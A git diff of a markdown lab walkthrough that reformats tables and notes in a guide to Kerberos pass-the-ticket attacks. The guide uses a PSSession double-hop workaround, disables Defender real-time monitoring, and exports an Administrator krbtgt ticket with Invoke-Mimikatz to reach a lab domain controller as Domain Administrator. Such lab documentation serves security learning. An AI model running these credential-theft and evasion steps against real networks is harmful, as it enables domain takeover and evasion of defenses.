@@ -12,19 +12,61 @@ tags: [windows, pass the ticket, PTT, krbtgt, klist, double hop, double hop bypa
 ## ENVIRONMENT SET-UP:
 #### MACHINES:
 
-HOSTNAME | MACHINE IP | OS | Description
---- | --- | --- | ---
-KALI-WINDOWS | 192.168.150.1 | Windows 10 | An attacker machine
-MSEDGEWIN10 | 192.168.150.128 | Windows 10 Enterprise Evaluation| A Remote Machine
-BOSSMANBEN | 192.168.150.133 | Windows Server 2016 | A Domain Controller
+<div style="overflow-x:auto">
+  <table>
+    <tr>
+      <th>HOSTNAME</th>
+      <th>MACHINE IP</th>
+      <th>OS</th>
+      <th>REMARKS</th>
+    </tr>
+    <tr>
+      <td>KALI-WINDOWS</td>
+      <td>192.168.150.1</td>
+      <td>Windows 10</td>
+      <td>An Attacker Machine</td>
+    </tr>
+    <tr>
+      <td>MSEDGEWIN10</td>
+      <td>192.168.150.128</td>
+      <td>Windows 10 Enterprise Evaluation</td>
+      <td>A Remote Machine; Domain Computer</td>
+    </tr>
+    <tr>
+      <td>WIN-BO2CT95INDP</td>
+      <td>192.168.150.133</td>
+      <td>Windows Server 2016</td>
+      <td>A Domain Controller</td>
+    </tr>
+  </table>
+</div>
 
 #### USERS:
 
-USER | MACHINE | PRIVILEGES
---- | --- | ---
-kali-windows\\jebidiah | kali-windows | Local Administrator
-BOSSMANBEN\\GConcy | MSEDGEWIN10 | Local Administrator; Domain User
-BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
+<div style="overflow-x:auto">
+  <table>
+    <tr>
+      <th>USER</th>
+      <th>MACHINE</th>
+      <th>PRIVILEGES</th>
+    </tr>
+    <tr>
+      <td>kali-windows</td>
+      <td>KALI-WINDOWS</td>
+      <td>Local Administrator</td>
+    </tr>
+    <tr>
+      <td>BOSSMANBEN\\GConcy</td>
+      <td>MSEDGEWIN10</td>
+      <td>Local Administrator; Domain User</td>
+    </tr>
+    <tr>
+      <td>BOSSMANBEN\\Administrator</td>
+      <td>MSEDGEWIN10</td>
+      <td>Domain Administrator</td>
+    </tr>
+  </table>
+</div>
 
 ---
 
@@ -55,8 +97,9 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
    ```powershell
    Enter-PSSession -ComputerName 192.168.150.128 -Credential BOSSMANBEN\GConcy
    ```
-   __NOTE(S)__:
    - Enter the credentials for BOSSMANBEN\GConcy in the password prompt
+
+   <span></span>
 
 2. Check for cached tickets using `klist`:
    ```
@@ -65,8 +108,9 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
 
    klist failed with 0xc000005f/-1073741729: A specified logon session does not exist. It may already have been terminated.
    ```
-   __NOTE(S)__:
    - The current established session doesn't seem to be a __*recognized*__ session.
+
+   <span></span>
 
 3. Register the current session while inside the PSSession created:
    ```powershell
@@ -102,8 +146,9 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
    
    ...omitted...
    ```
-   __NOTE(S)__:
    - Enter the credentials for BOSSMANBEN\GConcy in the password prompt
+
+   <span></span>
 
 4. Run `klist` again:
    ```
@@ -111,19 +156,21 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
 
    Cached Tickets: (0)
    ```
-   __NOTE(S)__:
    - `klist` can now check for cached tickets
    - Passing exported tickets using `Invoke-Mimikatz` would throw the same error from the previous `klist` if a proper session is not configured.
    - Even if an Administrator ticket was passed successfully, passing commands in or accessing the Domain Controller would be denied
      - The entire session should be restarted with the proper configuration.
 
+   <span></span>
+
 5. Type `Restart-Service WinRM` then enter a new PSSession with the registered configuration:
    ```powershell
    Enter-PSSession -ComputerName 192.168.150.128 -Credential BOSSMANBEN\GConcy -ConfigurationName GodConcy
    ```
-   __NOTE(S)__:
    - The shell will terminate after restarting the service.
    - Enter the credentials for BOSSMANBEN\GConcy in the password prompt
+
+   <span></span>
 
 6. Run `klist` again:
    ```
@@ -142,7 +189,6 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
            Cache Flags: 0x1 -> PRIMARY
            Kdc Called: WIN-BO2CT95INDP
    ```
-   __NOTE(S)__:
    - The session now actually runs as the user, __BOSSMANBEN\\GConcy__
    - This session now eliminates the __double hop__ problem:
      - Instead of the local machine sending a request to the remote machine before reaching the server, the local machine is now acting as or impersonating the remote machine running as the user __BOSSMANBEN\\GConcy__.
@@ -177,9 +223,10 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
 
      . .\Invoke-Mimikatz.powershell
      ```
-     __NOTE(S)__:
      - `-DisableRealtimeMonitoring $true` prevents the remote machine from detecting __Invoke-Mimikatz.powershell__ as a malicious script
-     
+      
+   <span></span>
+
 4. Export __*krbtgt tickets*__ using Invoke-Mimikatz:
    - PSSession (MSEDGEWIN10):
      ```powershell
@@ -241,7 +288,6 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
     
      ...omitted...
      ```
-     __NOTE(S)__:
      - A krbtgt ticket for the Domain (BOSSMANBEN.LOCAL) Administrator was exported
 
 #### iii. Pass the ticket using Invoke-Mimikatz
@@ -271,6 +317,7 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
 
    * File: '[0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi': OK
    ```
+
 3. View the cached tickets using `klist`:
    ```
    Current LogonId is 0:0xd0ebf
@@ -288,9 +335,11 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
            Cache Flags: 0x1 -> PRIMARY
            Kdc Called:
    ```
-   __NOTE(S)__:
    - The current ticket for the session is now `Administrator @ BOSSMANBEN.LOCAL` which is a Domain Administrator
    - The current PSSession should now be able to impersonate the Domain Administrator
+
+   <span></span>
+
 4. Check if the Domain Controller (BOSSMANBEN) now accessible:
    - Get the Primary Domain Controller for BOSSMANBEN:
      ```powershell
@@ -326,6 +375,6 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
      ```
      bossmanben\administrator
      ```
-   __NOTE(S)__:
-   - The file shares in the Domain Controller (BOSSMANBEN) are now accessible as long as the Domain Controller is being accessed using kerberos authentication.
-   - Commands could also now be executed in the context of the Domain Controller (BOSSMANBEN) using the `Invoke-Command` module in PowerShell.
+
+     - The file shares in the Domain Controller (BOSSMANBEN) are now accessible as long as the Domain Controller is being accessed using kerberos authentication.
+     - Commands could also now be executed in the context of the Domain Controller (BOSSMANBEN) using the `Invoke-Command` module in PowerShell.
